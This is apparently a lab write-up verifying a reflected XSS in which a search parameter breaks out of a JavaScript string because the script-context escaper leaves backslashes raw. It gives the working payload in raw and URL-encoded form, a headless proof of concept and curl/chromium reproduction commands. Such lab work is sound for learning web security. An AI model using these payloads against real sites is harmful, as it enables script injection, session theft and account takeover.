# Verification — Backslash-shift breakout in JS string

## Methodology
1. Reflection sweep (curl): marker → echoes (HTML body + inline script).
2. Metachar map (`'"<>\`) per echo, byte-read.
3. Shift hypothesis from escaper asymmetry (`\` raw in script, doubled in h1).
4. Positive proof headlessly with numeric side-effect (`document.title=N`, `//`-tailed).
5. Lab acceptance: real-browser `alert(1)` shift payload; banner polls.

## Evidence

### 1. Reflections (curl, `?search=reconprobe`)
```
<h1>0 search results for 'reconprobe'</h1>
var searchTerms = 'reconprobe';
```

### 2. Encoding map (curl, `?search=ENC'"<>\`)
```
h1    : ENC&apos;&quot;&lt;&gt;\\'     (quotes+brackets encoded; \ DOUBLED)
script: var searchTerms = 'ENC\'"&lt;&gt;\';   ('→\' ; <>→entities ; " raw ; \ RAW)
```
The asymmetry IS the finding: whoever wrote the h1 escaper handled backslashes;
the script escaper didn't. One character class decides exploitability.

### 3. Positive execution proof (headless dump-dom)
```
?search=%5C%27%3Bdocument.title%3D303001%3B%2F%2F
→ <title>303001</title>
→ rendered: var searchTerms = '\\';document.title=303001;//';
```
Exact derived shape in the response; title set on parse; no throw.

### 4. Lab acceptance
Real browser → `/?search=%5C%27%3Balert(1)%3B%2F%2F`
(INPUT raw: \';alert(1);//) → `alert(1)` during parse → `is-solved` (first poll).

### 5. Dead-end analysis
| Candidate | Verdict | Basis |
|---|---|---|
| Direct `';JS;//` | dead (would-be `\'` containment) | every lone `'` arrives escaped — the shift's leading `\` is load-bearing, not decorative |
| `</script>` closure | unnecessary (unfired) | JS-layer breakout available; kept as fallback, correctly unneeded |
| Tag injection / h1 context | dead | entities + full encoding |
| `"`-breakout | inert | content inside `'…'` |
| Multi-statement chains | same shape (untried) | `;s1;s2;//` fits identically — noted, not needed |

## Reproducibility
```
BASE=…
curl -s "$BASE/?search=ENC%27%22%3C%3E%5C" | grep -E "search results for|searchTerms = "
chromium --headless --no-sandbox --dump-dom "$BASE/?search=%5C%27%3Bdocument.title%3D303001%3B%2F%2F" | grep -o "<title>[^<]*</title>"
```

## Confirmation criteria
- CONFIRMED: dual reflections, per-location escaper asymmetry (`\` raw vs doubled),
  shift execution (title side-effect), real-browser acceptance.
- The h1's correct backslash handling is first-class evidence (proves knowledge +
  inconsistency, the coverage-gap signature).